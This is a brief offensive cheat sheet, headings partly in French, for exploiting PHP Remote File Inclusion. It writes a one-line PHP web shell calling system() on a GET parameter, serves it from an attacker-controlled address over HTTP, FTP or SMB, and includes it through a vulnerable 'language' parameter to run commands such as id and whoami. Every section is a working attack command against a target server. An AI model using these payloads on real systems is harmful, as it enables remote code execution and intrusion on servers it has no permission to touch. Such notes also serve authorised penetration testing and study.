# Remote File Inclusion

Verifier si dans la configuration de PHP nous avons `allow_url_include = On`

```sh
http://target.com/index.php?language=http://127.0.0.1:80/index.php
```

## Remote Code Execution with RFI

Host shell

```sh
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**HTTP**

```sh
python3 -m http.server 8080

/index.php?language=http://<OUR_IP>:8080/shell.php&cmd=id
```

**FTP**

```sh
python3 -m pyftpdlib -p 21

/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

**SMB**

```sh
impacket-smbserver -smb2support share $(pwd)

/index.php?language=\\<OUR_IP>\shell.php&cmd=whoami
```
